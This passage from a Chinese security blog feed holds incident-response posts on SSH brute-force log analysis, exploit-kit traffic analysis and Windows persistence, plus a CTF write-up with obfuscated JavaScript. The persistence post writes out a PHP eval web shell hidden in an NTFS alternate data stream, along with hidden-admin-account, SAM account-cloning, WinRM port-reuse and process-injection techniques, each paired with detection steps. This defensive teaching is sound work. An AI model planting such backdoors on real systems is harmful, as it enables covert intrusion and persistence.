src="https://gitee.com/m0re/picture/raw/master/img/20211103114056.png" loading="lazy"><br>现在确定了目前系统管理用户有<code>root&amp;m0re</code>两个用户。然后查看日志文件<code>/var/log/secure</code>，该日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。<br>但是新版的kali或者其他的Linux系统，可能不存在该文件。可能是</p><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/ssh/sshd_configLogLevel INFOSyslogFacility AUTHPRIV</code></pre><p>查看rsyslog的配置文件。其中有一行<br><code>auth,authpriv.* /var/log/auth.log</code><br>如果该文件很大则说明有人在破解你的root密码或者暴力破解<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103125734.png" loading="lazy"><br>现在需要确认是否被攻击。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> -o <span class="token string">"Failed password"</span> /var/log/auth.log<span class="token operator">|</span><span class="token function">uniq</span> -c</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211103125951.png" loading="lazy"><br>尝试攻击<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103131421.png" loading="lazy"><br>然后查看日志，看看失败日志是否变多。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103132220.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 输出登录爆破的第一行和最后一行，确认爆破时间范围</span><span class="token function">grep</span> <span class="token string">"Failed password"</span> /var/log/secure<span class="token operator">|</span><span class="token function">head</span> -1Jul  <span class="token number">8</span> <span class="token number">20</span>:14:59 localhost sshd<span class="token punctuation">[</span><span class="token number">14323</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user qwe from <span class="token number">111.13</span>.xxx.xxx port <span class="token number">1503</span> ssh2<span class="token function">grep</span> <span class="token string">"Failed password"</span> /var/log/secure<span class="token operator">|</span><span class="token function">tail</span> -1Jul <span class="token number">10</span> <span class="token number">12</span>:37:21 localhost sshd<span class="token punctuation">[</span><span class="token number">2654</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">111.13</span>.xxx.xxx port <span class="token number">13068</span> ssh2<span class="token comment"># 进一步定位有哪些IP在爆破？</span><span class="token function">grep</span> <span class="token string">"Failed password"</span> /var/log/auth.log<span class="token operator">|</span><span class="token function">grep</span> -E -o <span class="token string">"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span><span class="token operator">|</span><span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token comment"># 爆破用户名字典都有哪些？</span><span class="token function">grep</span> <span class="token string">"Failed password"</span> /var/log/secure<span class="token operator">|</span>perl -e <span class="token string">'while(<span class="token variable">$_</span>=&lt;>)&#123; /for(.*?) from/; print "<span class="token variable">$1</span><span class="token entity" title="\n">\n</span>";&#125;'</span><span class="token operator">|</span><span class="token function">uniq</span> -c<span class="token operator">|</span><span class="token function">sort</span> -nr      <span class="token number">9402</span>  root      <span class="token number">3265</span>  invalid user chenbo      <span class="token number">1245</span>  invalid user chenbin      <span class="token number">1025</span>  invalid user user      <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.</code></pre><p>查看管理员最近登录情况。</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/log<span class="token punctuation">]</span>└─<span class="token comment"># grep "Accepted " /var/log/auth.log | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr | more</span>      <span class="token number">2</span> <span class="token number">192.168</span>.88.1                                                                                                                                      ┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/log<span class="token punctuation">]</span>└─<span class="token comment"># grep "Accepted " /var/log/auth.log | awk '&#123;print $1,$2,$3,$9,$11&#125;'</span>Nov <span class="token number">3</span> <span class="token number">11</span>:56:40 root <span class="token number">192.168</span>.88.1Nov <span class="token number">3</span> <span class="token number">11</span>:56:41 root <span class="token number">192.168</span>.88.1</code></pre><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，发现了该IP地址已经登录成功。说明密码已经泄露，需要紧急修改密码。</p><h3 id="0x02-处理措施"><a href="#0x02-处理措施" class="headerlink" title="0x02 处理措施"></a>0x02 处理措施</h3><blockquote><p>1、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。<br>2、更改服务器ssh默认端口。<br>3、部署入侵检测设备，增强安全防护。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
          <category> Linux篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急响应篇】——流量分析练习(一)</title>
      <link href="/posts/32276993/"/>
      <url>/posts/32276993/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211102134515.jpeg" loading="lazy"><br>一个人如果只遵照他的内心去活着，他要么成为一个疯子，要么成为一个传奇。</p><a id="more"></a><h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p>第 1 级问题：</p><ol><li><p>被感染的 Windows 虚拟机的 IP 地址是多少？</p></li><li><p>被感染的 Windows 虚拟机的主机名是什么？</p></li><li><p>受感染虚拟机的 MAC 地址是多少？</p></li><li><p>受感染网站的 IP 地址是什么？</p></li><li><p>被入侵网站的域名是什么？</p></li><li><p>提供漏洞利用工具包和恶意软件的 IP 地址和域名是什么？</p></li></ol><p>第 2 级问题：</p><ol><li><p>指向漏洞利用工具包 (EK. 登陆页面的重定向 URL 是什么？</p></li><li><p>除了登陆页面（其中包含 CVE-2013-2551 IE 漏洞），EK 还发送了哪些其他漏洞？</p></li></ol><h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><ol><li>寻找被感染的Windows虚拟机的IP地址，直接看包序号1-10，前面几个已经可以看出来，(虚拟机地址一般是内网的，172开头，192开头等)<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102141428.png" loading="lazy"><br>所以第一题答案是<code>172.16.165.165</code></li><li>找主机名，可以直接搜索<code>Hosst Name</code>这样是使用CTRL+F直接查找字符串的方法。<br>还有就是过滤器筛选<code>dhcp</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102142310.png" loading="lazy"><br>主机名是<code>K34EN6W3N-PC</code><br>精准定位<code>HostName</code>，过滤器输入<code>dhcp.option.hostname</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102142440.png" loading="lazy"></li><li>找Mac地址，精确查找<code>dhcp.hw.mac_addr</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102153419.png" loading="lazy"><br>所以答案为：<code>f0:19:af:02:9b:f1</code></li><li>如果需要查找受感染网站的IP地址，只需看HTTP的数据包即可，因为黑客攻击网站首先是可以访问的，而且攻击过程中一定会多次进行访问（不正常次数），所以使用过滤器先对HTTP的数据包进行过滤，然后再进行查看。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102154214.png" loading="lazy"><br>看到了<code>172.16.165.165</code>对<code>82.150.140.30</code>进行了大量的访问，产生了很多访问记录，同时看后面，该IP地址也回应了许多状态码为200的数据包。所以可以确定了这个收感染的IP地址为<code>82.150.140.30</code></li><li>随意找个172对82发出请求的HTTP数据包，跟踪数据流即可看到Host。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102154746.png" loading="lazy"><br>网站域名为：<code>www.ciniholland.nl</code></li><li>提供漏洞利用工具包和软件的IP地址和域名，找这个信息，需要先捋清楚一点，就是工具包是联网从网络上下载下来的，就是HTTP数据包，下载记录，在接受的时候文件会隐藏在数据包中。所以直接导出HTTP对象查看。<br>然后使用杀软来扫描<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102155643.png" loading="lazy"><br>发现了病毒木马，直接定位相应数据包进行查看。<br>然后问题的答案也都揭晓了。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102155918.png" loading="lazy"><br>IP地址: <code>37.200.69.143</code>，域名: <code>http://stand.trustandprobaterealty.com</code><br>同时可以看到，传输过来的数据，也就是从网站上下载的数据内容是个压缩包。</li><li>指向漏洞利用工具包 (EK) 登陆页面的重定向 URL 是什么？<br>登录页面的重定向URL，已经找到了漏洞下载那边url和IP地址（上一题），所以就找它前面的数据包，正常逻辑（先登录在下载内容）<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102182654.png" loading="lazy"><br>可以看到在<code>37.200.69.143</code>前面有一个陌生的IP地址，这个就是登陆前的重定向IP地址。查看与这个IP地址交互的数据包中的url。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102183602.png" loading="lazy"><br>答案：<a href="http://24corp-shop.com/">http://24corp-shop.com/</a></li><li>除了登陆页面（其中包含 CVE-2013-2551 IE 漏洞），EK 还发送了哪些其他漏洞？<br>在HTTP导出的对象中，看到相关内容。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102183844.png" loading="lazy"><br>导出后，将相应文件改后缀名，swf文件或者jar文件。等重命名一下（改后缀）上传至微步沙箱即可查看相应的CVE编号<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211102184211.png" loading="lazy"><br>jar包同样。<a href="https://s.threatbook.cn/">微步沙箱</a><h2 id="到此"><a href="#到此" class="headerlink" title="到此"></a>到此</h2>因为后面的问题，没有数据分析的地方了，所以就直接略过了。<br>学习出处：<a href="https://mp.weixin.qq.com/s/ZeFaS0cxIB3ZOnR2kSm7zw">潇湘信安</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应篇——权限维持</title>
      <link href="/posts/95384c9a/"/>
      <url>/posts/95384c9a/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211101190629.jpeg" loading="lazy"><br>反正你也看不到，少写一行又何妨？</p><a id="more"></a><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>思路摘自GitHub开源项目，应急响应篇<a href="https://github.com/terry494/fengchenzxc.github.io">https://github.com/terry494/fengchenzxc.github.io</a></p><h2 id="Windows权限维持——隐藏"><a href="#Windows权限维持——隐藏" class="headerlink" title="Windows权限维持——隐藏"></a>Windows权限维持——隐藏</h2><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><ol><li>利用文件属性来将一个文件进行隐藏<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211028121847.png" loading="lazy"><br>选择显示隐藏文件即可再次查看到这个文件。<br>另一种隐藏方式：<code>attrib +s +a +h +r</code>命令，给原本的文件夹或文件增加了系统文件属性，存档文件属性，只读文件属性和隐藏文件属性。<pre class="language-bash" data-language="bash"><code class="language-bash">attrib +s +a +h +r D:<span class="token punctuation">\</span>test<span class="token punctuation">\</span>test.txt</code></pre>这样就做到了 真正的隐藏文件，即使显示隐藏文件也无法看到此文件。<br>如何查看：在控制面板选择文件夹选项卡分类，然后点击查看，向下找到显示隐藏文件/文件夹和驱动器<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211028123955.png" loading="lazy"></li><li>利用ADS隐藏文件内容<br>在服务器上echo一个数据流文件<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> ^<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'m0re'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?^<span class="token operator">></span> <span class="token operator">></span> index.php:header.jpg</code></pre>然后生成了一个<code>index.php</code>，但是没有内容，是个空文件。真正的<code>shell</code>是<code>header.jpg</code>，查看该后门。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211028131647.png" loading="lazy"><br>查看使用notepad(默认记事本)</li><li>驱动级文件隐藏<br>驱动隐藏，通过软件来实现，<code>Easy File Locker</code><br>如果在网站目录中没有发现相关的文件，且系统目录存在以下文件<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>xlkfs.datc:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>xlkfs.dllc:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>xlkfs.inic:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>xlkfs.sys</code></pre>那么就是驱动级文件隐藏，清除方法<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、查询服务状态： sc qc xlkfs<span class="token number">2</span>、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现<span class="token number">3</span>、删除服务： sc delete xlkfs<span class="token number">4</span>、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</code></pre><h3 id="0x02-隐藏账号"><a href="#0x02-隐藏账号" class="headerlink" title="0x02 隐藏账号"></a>0x02 隐藏账号</h3>Windows隐藏系统用户操作，在cmd命令下建立一个用户名为<code>test$</code>的隐藏用户，并将隐藏账户提升为管理员权限。<pre class="language-bash" data-language="bash"><code class="language-bash">net user test$ abc123<span class="token operator">!</span> /addnet localgroup administrators test$ /add</code></pre>然后使用<code>net user</code>命令就看不到该用户。需要在控制面板显示。</li><li>制作克隆账号<br>打开注册表<code>win+R</code>输入<code>regedit</code>到注册表中查看。<code>HKEY_LOCAL_MACHINE\SAM\SAM</code><br>右键单击选择权限，然后选中<code>administrator</code>这个选项，将下面的权限中的完全空中和读取勾选<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211029203257.png" loading="lazy"><br>然后点击应用，返回注册表编辑器中，再打开<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>找到<code>test$</code>用户<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211029203829.png" loading="lazy"><br>键值的类型中显示<code>0x3ec</code>找到箭头所指目录。<br>找到administrator所对应的的项为<code>000001F4</code>，将<code>000001F4</code>的F值复制到<code>000003EB</code>的F值中，保存。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211029204037.png" loading="lazy"><br>选取然后复制。<br>粘贴到Names上面的文件中的F值。<br>将<code>test$</code>和<code>003eb</code>导出注册表文件。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211029204416.png" loading="lazy"><br>再使用cmd命令删除<code>test$</code>这个用户<br><code>net user test$ /del</code><br>再将之前导入的两个文件重新导入。<br>就成功克隆了账号，可以使用D盾来检测，使用工具里的克隆账号检测<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211029210845.png" loading="lazy"><br>直接删除就可以。<br>还有就是通过注册表查看。（通过控制面板韩剧用户组文件等是查看不到的）<h3 id="0x03-端口复用"><a href="#0x03-端口复用" class="headerlink" title="0x03 端口复用"></a>0x03 端口复用</h3>端口复用可以用来隐藏端口的目的。在Windows下如何隐藏端口？<pre class="language-bash" data-language="bash"><code class="language-bash">winrm <span class="token builtin class-name">set</span> winrm/config/service @<span class="token punctuation">&#123;</span>EnableCompatibilityHttpListener<span class="token operator">=</span><span class="token string">"true"</span><span class="token punctuation">&#125;</span></code></pre>Windows中一条命令即可实现端口复用后门，一般开启WinRM服务作为远程管理，这里也可以用来作端口复用。一种简单的端口复用方式，假设攻击者已经获取到administrator的账号密码，远程连接WinRM服务执行命令<pre class="language-bash" data-language="bash"><code class="language-bash">winrs -r:http://192.168.1.141 -u:administrator -p:abc123<span class="token operator">!</span> <span class="token function">whoami</span></code></pre>也可以使用工具来实现端口复用，<a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a><br>不过端口复用在实战中用处好像不是太大。所以也没有做深入了解。<h3 id="0x04-进程注入"><a href="#0x04-进程注入" class="headerlink" title="0x04 进程注入"></a>0x04 进程注入</h3>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。</li><li>meterpreter会话注入<br>如果权限低，无法得到进行<code>hashdump</code><br>就使用meterpreter进行会话注入高权限的进程。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211030121738.png" loading="lazy"><br>查看一下进程，选择一个。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211030122108.png" loading="lazy"></li><li>Empire会话进程注入<br>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211101190148.png" loading="lazy"><br>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211101190951.png" loading="lazy"><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211101191005.png" loading="lazy"></li><li>Cobalt Strike进程注入<br>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211101191037.png" loading="lazy"><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211101191050.png" loading="lazy"><br>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211101191111.png" loading="lazy"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>首届&quot;陇剑杯&quot;网络安全大赛线下赛</title>
      <link href="/posts/2eb2096f/"/>
      <url>/posts/2eb2096f/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20210929162139.jpeg" loading="lazy"></p><p>过去好几天了，最近趁着国庆有时间把这次线下赛所得记录一下，可能会是一篇日记hhhh</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>侥幸进入线下赛，领路了兰州古城风光，旅游日记。哦对了，中国移动牛逼！😍</p><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001180205.png" alt="m0re_2021-09-25_17-29-52" loading="lazy"></p><p>导出HTTP对象后，在html中找到了6.html，里面发现了颜文字</p><pre class="language-js" data-language="js"><code class="language-js">ﾟωﾟﾉ<span class="token operator">=</span> <span class="token operator">/</span>｀ｍ´）ﾉ <span class="token operator">~</span>┻━┻   <span class="token comment">//*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');</span></code></pre><p>控制台跑一下，就可以得到flag</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001181330.png" alt="image-20211001181328225" loading="lazy"></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001181450.png" alt="m0re_2021-09-25_17-29-59" loading="lazy"></p><p><a href="https://mp.weixin.qq.com/s/9fopUOhL0Met0lZxV-5S1A">https://mp.weixin.qq.com/s/9fopUOhL0Met0lZxV-5S1A</a></p><p>在写这篇文章之前。我也是看了看有没有别的师傅写wp，然后再微信中找到了一个，首先说明，没有别的意思，仅仅只是有些不合适的地方不应该误导师傅们。</p><p>题目说答案为8位，而且是按顺序拼接的，找的时候发现攻击者在登录时，IP被ban了，然后就做了一些处理。加了个<code>X-Forwarded-For</code>，然后看黑客在爆破登录框的时候，数据包长度在中间有发生变化，就是变为893，而且只有8个数据包长度是这样的，看过前后的数据包之后，也是发现只有这八个数据包中有<code>X-Forwarded-For</code>头</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001190631.png" alt="image-20211001183001560" loading="lazy"></p><p>所以就基本可以确实正确答案了，八个数据包中各取一位拼接在一起组成8位的正确答案。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001183347.png" alt="image-20211001183345313" loading="lazy"></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001183404.png" alt="image-20211001183402786" loading="lazy"></p><p>所以最后答案为：<code>5346CFF3</code></p><p>上面公众号里的此题答案与思路均不正确。没有针对的意思，只是对题目讨论。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001190614.png" alt="m0re_2021-09-25_17-30-05" loading="lazy"></p><p>很简单，几乎是签到题，不说了，只保留下题目。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001190901.png" alt="m0re_2021-09-25_17-30-11" loading="lazy"></p><p>压缩包是可以找到的，但是被加密了，后来主办方提示</p><blockquote><p>需要一定的社工基础</p></blockquote><p>题目放着，解法暂无。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211001191344.png" alt="m0re_2021-09-25_17-30-16" loading="lazy"></p><p>由于题目是将内容放在两个文件，在流量包中发现的可疑点只有这里</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002141705.png" 